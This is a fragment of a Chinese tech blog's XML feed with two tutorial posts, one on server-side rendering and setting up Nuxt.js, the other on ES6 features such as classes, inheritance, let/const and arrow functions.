      <link href="2020/11/08/SSR-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B8%B2%E6%9F%93%E4%B8%8Enuxt.js/"/>
      <url>2020/11/08/SSR-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B8%B2%E6%9F%93%E4%B8%8Enuxt.js/</url>
      
        <content type="html"><![CDATA[<ul><li>服务端渲染基础<ul><li>传统服务端渲染</li><li>SPA 单页应用</li><li>同构应用</li><li>如何实现同构渲染</li></ul></li><li>Nuxt.js 基础</li><li>Nuxt.js 综合案例 </li></ul><h2 id="服务端渲染基础"><a href="#服务端渲染基础" class="headerlink" title="服务端渲染基础"></a>服务端渲染基础</h2><h3 id="传统服务端渲染"><a href="#传统服务端渲染" class="headerlink" title="传统服务端渲染"></a>传统服务端渲染</h3><ul><li><p>最早期，Web 页面渲染都是在服务端完成的，即服务端运行过程中将所需的数据结合页面模板渲染为</p><p>HTML，响应给客户端浏览器。所以浏览器呈现出来的是直接包含内容的页面。</p></li><li><p>这种方式的代表性技术有：ASP、PHP、JSP，再到后来的一些相对高级一点的服务端框架配合一些模板</p><p>引擎</p></li><li><p>在今天看来，这种渲染模式是不合理或者说不先进的。因为在当下这种网页越来越复杂的情况下，这种</p><p>模式存在很多明显的不足：</p><ul><li><p>应用的前后端部分完全耦合在一起，在前后端协同开发方面会有非常大的阻力；</p></li><li><p>前端没有足够的发挥空间，无法充分利用现在前端生态下的一些更优秀的方案；</p></li><li><p>由于内容都是在服务端动态生成的，所以服务端的压力较大；</p></li><li><p>相比目前流行的 SPA 应用来说，用户体验一般；</p></li></ul></li></ul><h3 id="SPA单页应用"><a href="#SPA单页应用" class="headerlink" title="SPA单页应用"></a>SPA单页应用</h3><ul><li>随着ajax的发展（AJAX 是与服务器交换数据并更新部分网页的艺术，在不重新加载整个页面的情况下）以及前端框架的发展，Vue，React，Angular 都是基于客户端渲染的前端框架，这类框架所构建的都是单页应用（SPA）</li><li>优点<ul><li>用户体验好</li><li>开发效率高</li><li>渲染性能好</li><li>可维护性好</li></ul></li><li>缺点<ul><li>首屏渲染时间长</li><li>不利于 SEO</li></ul></li></ul><h3 id="同构应用"><a href="#同构应用" class="headerlink" title="同构应用"></a>同构应用</h3><ul><li>同构服务端渲染首屏直出，解决 SPA 应用首屏渲染慢以及不利于 SEO 问题</li><li>然后通过客户端渲染接管页面内容交互得到更好的用户体验</li><li>实际是【服务端渲染】 + 【客户端渲染】的结合</li><li>优点：首屏渲染速度快、有利于 SEO</li><li>缺点：<ul><li>开发成本高。</li><li>涉及构建设置和部署的更多要求。与可以部署在任何静态文件服务器上的完全静态单页面应用程序 (SPA) 不同，服务器渲染应用程序，一般需要处于 Node.js server 运行环境。</li><li>更多的服务器端负载。在 Node.js 中渲染完整的应用程序，显然会比仅仅提供静态文件的server 更加大量占用 CPU 资源 (CPU-intensive - CPU 密集)，因此如果你预料在高流量环境(high traffic) 下使用，请准备相应的服务器负载，并明智地采用缓存策略</li></ul></li></ul><h3 id="如何实现同构渲染"><a href="#如何实现同构渲染" class="headerlink" title="如何实现同构渲染"></a>如何实现同构渲染</h3><ul><li>Vue、React等框架的官方解决方案</li><li>使用第三方解决方案<ul><li>React 生态的 Next.js</li><li>Vue 生态的 Nuxt.js</li></ul></li></ul><h2 id="Nuxt-js-基础"><a href="#Nuxt-js-基础" class="headerlink" title="Nuxt.js 基础"></a>Nuxt.js 基础</h2><p>Nuxt.js 是一个基于 Vue.js 的服务端渲染应用框架，它可以帮我们轻松的实现同构应用。</p><p>通过对客户端/服务端基础架构的抽象组织，Nuxt.js 主要关注的是应用的 <strong>UI渲染</strong>。</p><ul><li><a href="https://zh.nuxtjs.org/" target="_blank" rel="noopener">官网</a></li><li><a href="https://github.com/nuxt/nuxt.js" target="_blank" rel="noopener">Github仓库</a></li></ul><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><pre class=" language-js"><code class="language-js"># 创建项目目录 mkdir realworld<span class="token operator">-</span>nuxtjs # 进入项目目录 cd realworld<span class="token operator">-</span>nuxtjs # 生成 <span class="token keyword">package</span><span class="token punctuation">.</span>json 文件 npm init <span class="token operator">-</span>y # 安装 nuxt 依赖 npm install nuxt</code></pre><p>在 <code>package.json</code> 中添加启动脚本：</p><pre class=" language-json"><code class="language-json"><span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>     <span class="token property">"dev"</span><span class="token operator">:</span> <span class="token string">"nuxt"</span> <span class="token punctuation">}</span></code></pre><p><code>npm run dev</code> 启动服务</p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><em>Nuxt.js 依据</em> <code>pages</code> <em>目录结构自动生成</em> <a href="https://github.com/vuejs/vue-router" target="_blank" rel="noopener">vue-router</a> <em>模块的路由配置。</em></p><p>假设 <code>pages</code> 的目录结构如下：</p><pre class=" language-bash"><code class="language-bash">pages/--<span class="token operator">|</span> user/-----<span class="token operator">|</span> index.vue-----<span class="token operator">|</span> one.vue--<span class="token operator">|</span> index.vue</code></pre><p>那么，Nuxt.js 自动生成的路由配置如下：</p><pre class=" language-js"><code class="language-js">router<span class="token punctuation">:</span> <span class="token punctuation">{</span>  routes<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>      name<span class="token punctuation">:</span> <span class="token string">'index'</span><span class="token punctuation">,</span>      path<span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>      component<span class="token punctuation">:</span> <span class="token string">'pages/index.vue'</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>      name<span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">,</span>      path<span class="token punctuation">:</span> <span class="token string">'/user'</span><span class="token punctuation">,</span>      component<span class="token punctuation">:</span> <span class="token string">'pages/user/index.vue'</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>      name<span class="token punctuation">:</span> <span class="token string">'user-one'</span><span class="token punctuation">,</span>      path<span class="token punctuation">:</span> <span class="token string">'/user/one'</span><span class="token punctuation">,</span>      component<span class="token punctuation">:</span> <span class="token string">'pages/user/one.vue'</span>    <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h2 id="Nuxt-js-综合案例"><a href="#Nuxt-js-综合案例" class="headerlink" title="Nuxt.js 综合案例"></a>Nuxt.js 综合案例</h2><ul><li><a href="https://github.com/gothinkster/realworld" target="_blank" rel="noopener">GitHub仓库</a></li><li><a href="https://demo.realworld.io/#/" target="_blank" rel="noopener">在线示例</a></li><li><a href="https://github.com/gothinkster/realworld/tree/master/api" target="_blank" rel="noopener">接口文档</a></li><li><p><a href="https://github.com/gothinkster/realworld-starter-kit/blob/master/FRONTEND_INSTRUCTIONS.md" target="_blank" rel="noopener">页面模板</a></p></li><li><p><a href="https://github.com/jinjingxuan/realworld-nuxtJs" target="_blank" rel="noopener">项目地址</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SSR </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ES扩展</title>
      <link href="2020/11/06/JavaScript-ES%E6%89%A9%E5%B1%95/"/>
      <url>2020/11/06/JavaScript-ES%E6%89%A9%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<ul><li>ES6的class</li><li>ES6的继承，extend与super</li><li>ES6的let与const</li><li>对象字面量的增强</li><li>object.assign</li><li>Set数据结构</li><li>Symbol可作为键</li><li>forEach、find、map、filter、reduce、every、some</li><li>ES2017</li><li>Array.from</li></ul><h2 id="class"><a href="#class" class="headerlink" title="class"></a>class</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//定义了一个名字为Person的类</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//constructor是一个构造方法，用来接收参数</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//this代表的是实例对象</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//这是一个类的方法，注意千万不要加上function</span>        <span class="token keyword">return</span> <span class="token string">"我的名字叫"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"今年"</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token operator">+</span><span class="token string">"岁了"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> obj<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"laotie"</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//我的名字叫laotie今年88岁了</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> Person<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//function</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Person<span class="token operator">===</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//true</span><span class="token comment" spellcheck="true">//实际上类的所有方法都定义在类的prototype属性上。</span><span class="token comment" spellcheck="true">//还可以通过Object.assign方法来为对象动态增加方法</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">,</span><span class="token punctuation">{</span>    getName<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    getAge<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">var</span> obj<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"laotie"</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//laotie</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//88</span><span class="token comment" spellcheck="true">//constructor方法是类的构造函数的默认方法，通过new命令生成对象实例时，自动调用该方法。</span><span class="token keyword">class</span> <span class="token class-name">Box</span><span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"啦啦啦，今天天气好晴朗"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//当实例化对象时该行代码会执行。</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> obj<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Box</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//类的所有实例共享一个原型对象，它们的原型都是Person.prototype，所以proto属性是相等的</span><span class="token keyword">class</span> <span class="token class-name">Box</span><span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span>num2<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>num1 <span class="token operator">=</span> num1<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>num2 <span class="token operator">=</span> num2<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> num1<span class="token operator">+</span>num2<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//box1与box2都是Box的实例。它们的__proto__都指向Box的prototype</span><span class="token keyword">var</span> box1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Box</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> box2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Box</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>box1<span class="token punctuation">.</span>__proto__<span class="token operator">===</span>box2<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//true</span><span class="token comment" spellcheck="true">//由此，也可以通过proto来为类增加方法。使用实例的proto属性改写原型，会改变Class的原始定义，影响到所有实例，所以不推荐使用！</span></code></pre><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token keyword">extends</span> <span class="token class-name">a</span><span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//要在this的前面</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>z <span class="token operator">=</span> z<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">toString2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>z    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//super表示父类的构造函数，并且子类的构造函数必须执行一次super</span><span class="token comment" spellcheck="true">//`super()`相当于`a.prototype.constructor.call(this)`</span></code></pre><ul><li>super完成了调用父类构造函数，extends实现了原型链的继承，本质上和ES5是一样的</li></ul><h3 id="继承的时候extends干了什么"><a href="#继承的时候extends干了什么" class="headerlink" title="继承的时候extends干了什么"></a>继承的时候extends干了什么</h3><p><strong>extends在实现继承方面，本质上也是原型链继承,该方法实现了两步原型链继承</strong><br>大多数浏览器的 ES5 实现之中，每一个对象都有<strong>proto</strong>属性，指向对应的构造函数的prototype属性。<br>Class 作为构造函数的语法糖，同时有prototype属性和<strong>proto</strong>属性，因此同时存在两条继承链。</p><ul><li>（1）子类的<strong>proto</strong>属性，表示构造函数的继承，总是指向父类。（把子类构造函数(<code>Child</code>)的原型(<code>__proto__</code>)指向了父类构造函数(<code>Parent</code>)，）</li><li>（2）子类prototype属性的<strong>proto</strong>属性，表示方法的继承，总是指向父类的prototype属性。</li><li><a href="https://images2018.cnblogs.com/blog/1290444/201805/1290444-20180522190257058-425523963.png" target="_blank" rel="noopener">ES5继承</a></li><li><a href="https://images2018.cnblogs.com/blog/1290444/201805/1290444-20180522190423509-1503553581.png" target="_blank" rel="noopener">ES6继承</a></li></ul><p>ES5只有两种声明变量的方式：var和function，ES6还添加了两种常用的声明变量的方式：let和const。</p><h2 id="let命令"><a href="#let命令" class="headerlink" title="let命令"></a>let命令</h2><p>ES6新增了let命令，用来声明变量，它的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效。</p><p>1、for循环的计数器，就很合适使用let。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>a<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 10</span></code></pre><p>变量i是var声明的，在全局范围内有效，所以每次循环新的i值都会覆盖旧值，导致最后输出的是最后一轮的i的值。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 5</span></code></pre><p>使用let，声明的变量仅在块级作用域内有效，最后输出的是5。</p><p>2、let不存在变量提升：let不像var那样会发生变量提升，所以，变量一定要在声明后使用，否则报错。</p><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出：undefined</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 报错</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span></code></pre><p>3、暂时性死区：</p><p>只要块级作用域存在let命令，它所声明的变量就绑定到这个区域，不再受外部的影响。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> i<span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 报错</span>    <span class="token keyword">let</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ES6明确规定，若块作用域中存在let和const命令，则它们声明的变量，从一开始就形成了封闭作用域，凡是在声明之前就使用这些变量，就会报错。</p><p>在代码块内，使用let命令声明变量之前，该变量都是不可用的（不可赋值，不可访问等），这称为“暂时性死区”。</p><p>暂时性死区使得typeof操作不一定安全，所以在let声明之前，使用typeof操作符会报错。而在let出现之前，typeof是百分之百安全的，永远不会被报错，即使变量没有被声明，typeof也会返回undefined。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 报错</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// undefined</span>    <span class="token keyword">let</span> x<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>暂时性死区的本质：只要一进入当前作用域，所要使用的变量就已经存在了，但是不可获取，只有等到声明变量的那一行代码出现，才可以获取和使用该变量。</p><p>ES6规定暂时性死区和let、const语句不出现变量提升，主要是为了减少运行时错误，防止变量在声明前就使用该变量，从而导致意料之外的错误。这类错误在ES5中很常见。</p><p>4、不允许重复声明</p><p>let不允许在相同作用域内，重复声明同一个变量。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 报错</span>    <span class="token keyword">var</span> i<span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 报错</span>    <span class="token keyword">let</span> i<span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>不能在函数内部重新声明参数。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 报错</span>    <span class="token keyword">let</span> arg<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 不报错</span>    <span class="token punctuation">{</span>        <span class="token keyword">let</span> arg<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="const命令"><a href="#const命令" class="headerlink" title="const命令"></a>const命令</h2><p>const声明一个只读的常量，一旦声明，常量的值就不能改变，这意味着，const一旦声明常量，就必须立即初始化，不能等到之后再赋值。因此，改变常量和只声明不赋初始值都会报错。</p><p>const的作用域与let命令相同，只在声明所在的块级作用域内有效。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 报错</span></code></pre><p>const声明的常量也不提升，同时存在暂时性死区，只能在声明的位置后面使用。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 报错</span>    <span class="token keyword">const</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>const声明的常量，也和let一样不可重复声明。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> i <span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 报错</span><span class="token keyword">const</span> j <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 报错</span></code></pre><p>对于复合类型的常量，常量名不指向数据，而是指向数据所在的地址。const命令只是保证常量名指向的地址不变，并不保证该地址的数据不变，也就是说，将对象常量指向另一个地址会报错，但对象本身是可变的，可以为其添加，修改属性，因此将一个对象声明为常量必须十分小心。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span>name <span class="token operator">=</span> “Alice”<span class="token punctuation">;</span>obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 报错</span></code></pre><p>将一个数组声明为常量，该数组本身是可写的，但是若将另一个数组赋值给该数组，会报错。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 报错</span></code></pre><p>转载自<a href="https://blog.csdn.net/zhouziyu2011/article/details/68067609" target="_blank" rel="noopener">https://blog.csdn.net/zhouziyu2011/article/details/68067609</a></p><pre class=" language-js"><code class="language-js">不用<span class="token keyword">var</span>，主用<span class="token keyword">const</span>，配合<span class="token keyword">let</span>主用<span class="token keyword">const</span>的好处是用于判断变量是否需要更改</code></pre><hr><ul><li><strong>箭头函数</strong></li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//不需要 function 关键字来创建函数</span><span class="token comment" spellcheck="true">//省略 return 关键字</span><span class="token comment" spellcheck="true">//继承当前上下文的 this 关键字</span><span class="token comment" spellcheck="true">// ES5</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//map方法返回一个由原数组中的每个元素调用指定方法后的返回值组成的新数组。</span>    <span class="token keyword">return</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//array.map(function() {}, this) 的作用实际上和 array.map(function() {}.bind(this)) 是一样的。map的第二个参数就是给第一个参数bind一个对象。</span><span class="token comment" spellcheck="true">// 使用箭头函数</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>x <span class="token operator">=</span><span class="token operator">></span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li><strong>函数默认参数值</strong></li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// ES6之前，当未传入参数时，text = 'default'；</span><span class="token keyword">function</span> <span class="token function">printText</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token punctuation">{</span>    text <span class="token operator">=</span> text <span class="token operator">||</span> <span class="token string">'default'</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" 